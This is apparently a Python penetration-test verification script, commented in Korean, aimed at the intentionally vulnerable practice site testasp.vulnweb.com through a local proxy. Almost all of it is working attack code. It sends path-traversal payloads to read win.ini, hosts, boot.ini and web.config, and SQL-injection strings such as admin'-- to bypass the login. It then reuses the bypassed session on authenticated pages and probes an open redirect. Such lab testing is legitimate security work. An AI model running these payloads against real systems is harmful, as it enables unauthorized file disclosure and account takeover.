#!/usr/bin/env python3
"""Round 4 검증 v2 — 본문 추출을 curl -D/-o 파일 분리 방식으로 고쳐서 재실행."""
import subprocess, urllib.parse, os, hashlib

BASE = "http://testasp.vulnweb.com"
PROXY = ["-x", "http://127.0.0.1:8080",
         "--cacert", "/home/taeuk/.mitmproxy/mitmproxy-ca-cert.pem"]
os.makedirs("/tmp/exploit/v2", exist_ok=True)
_n = [0]


def curl(url, data=None, jar=None, extra=None):
    """returns (status_line, header_dict_list, body_text)"""
    _n[0] += 1
    hp, bp = f"/tmp/exploit/v2/h{_n[0]}.txt", f"/tmp/exploit/v2/b{_n[0]}.txt"
    cmd = ["curl", "-s", "-D", hp, "-o", bp, "-m", "30"] + PROXY
    if jar:
        cmd += ["-b", jar, "-c", jar]
    if data:
        cmd += ["-X", "POST", "--data", data]
    if extra:
        cmd += extra
    cmd += [url]
    subprocess.run(cmd, capture_output=True, text=True)
    head = open(hp, encoding="latin-1").read()
    body = open(bp, encoding="latin-1").read()
    status = head.split("\n")[0].strip()
    hdrs = [l.strip() for l in head.split("\n")[1:] if l.strip()]
    return status, hdrs, body


def hdr(hdrs, name):
    return [h for h in hdrs if h.lower().startswith(name.lower() + ":")]


print("=" * 92)
print("### (a) traversal — windows/win.ini 실제 내용 (증거)")
pay = urllib.parse.quote("../../../../../../../../windows/win.ini", safe="")
st, hd, body = curl(f"{BASE}/Templatize.asp?item={pay}")
print(f"  status: {st}  body_len={len(body)}  sha={hashlib.sha256(body.encode('latin-1')).hexdigest()[:12]}")
open("/tmp/exploit/v2/win_ini_proof.txt", "w", encoding="latin-1").write(body)
print("  --- 본문(앞 40줄) ---")
print("\n".join(body.split("\n")[:40]))

print()
print("### (a2) 같은 기법으로 읽히는 다른 시스템 파일")
for p in ["../../../../../../../../windows/win.ini",
          "../../../../../../../../windows/system32/drivers/etc/hosts",
          "../../../../../../../../boot.ini",
          "../../../../../../../../windows/system.ini",
          "../../../../../../../../inetpub/wwwroot/testasp/Default.asp",
          "../../../../../../../../inetpub/wwwroot/testasp/web.config"]:
    st, hd, b = curl(f"{BASE}/Templatize.asp?item=" + urllib.parse.quote(p, safe=""))
    first = " | ".join([l for l in b.split("\n") if l.strip()][:1])[:60]
    print(f"  {p.split('../../')[-1]:45s} -> {st[:28]} len={len(b):6d}  {first}")

print()
print("### (b) html/../web.config 내용 확인")
st, hd, b = curl(f"{BASE}/Templatize.asp?item=html/../web.config")
print(f"  status: {st} len={len(b)}")
print("  --- 앞 30줄 ---")
print("\n".join(b.split("\n")[:30]))

print()
print("### (c) 로그인 우회 — 매 시도마다 새 세션, 302 Location 확인")
for i, d in enumerate(["tfUName=admin'--&tfUPass=x",
                       "tfUName=x' OR 'x'='x&tfUPass=x",
                       "tfUName=admin&tfUPass=' OR '1'='1",
                       "tfUName=' OR '1'='1'--&tfUPass=x"]):
    jar = f"/tmp/exploit/v2/bypass{i}.jar"
    st, hd, b = curl(f"{BASE}/Login.asp", data=d, jar=jar)
    print(f"  {d:38s} -> {st[:34]}  Location={hdr(hd,'location')}")

print()
print("### (d) 우회 세션으로 인증 상태 확인 (새 세션 → 로그인 → Default.asp)")
jar = "/tmp/exploit/v2/authed.jar"
st, hd, b = curl(f"{BASE}/Login.asp", data="tfUName=admin'--&tfUPass=x", jar=jar)
print(f"  로그인: {st[:34]} Location={hdr(hd,'location')}")
st, hd, b = curl(f"{BASE}/Default.asp", jar=jar)
print(f"  GET /Default.asp: {st[:34]} len={len(b)}")
menu = [l.strip() for l in b.split("\n") if "Login.asp" in l or "Logout" in l or "logout" in l]
for m in menu[:2]:
    print("    메뉴:", m[:230])
print("  'logout' 등장:", "logout" in b.lower())
st, hd, b = curl(f"{BASE}/showthread.asp?id=0", jar=jar)
print(f"  GET /showthread.asp?id=0: {st[:34]} len={len(b)}  <form>={'<form' in b.lower()} textarea={'textarea' in b.lower()}")
for l in b.split("\n"):
    if "<form" in l.lower() or "textarea" in l.lower():
        print("     ", l.strip()[:180])

print()
print("### (e) RetURL open redirect (우회 로그인 + RetURL) — 새 세션")
for r_ in ["http://example.com/", "//example.com/", "http://testasp.vulnweb.com/Default.asp"]:
    jar = "/tmp/exploit/v2/returl.jar"
    if os.path.exists(jar):
        os.remove(jar)
    st, hd, b = curl(f"{BASE}/Login.asp?RetURL=" + urllib.parse.quote(r_, safe=""),
                     data="tfUName=admin'--&tfUPass=x", jar=jar)
    print(f"  RetURL={r_:40s} -> {st[:34]} Location={hdr(hd,'location')}")
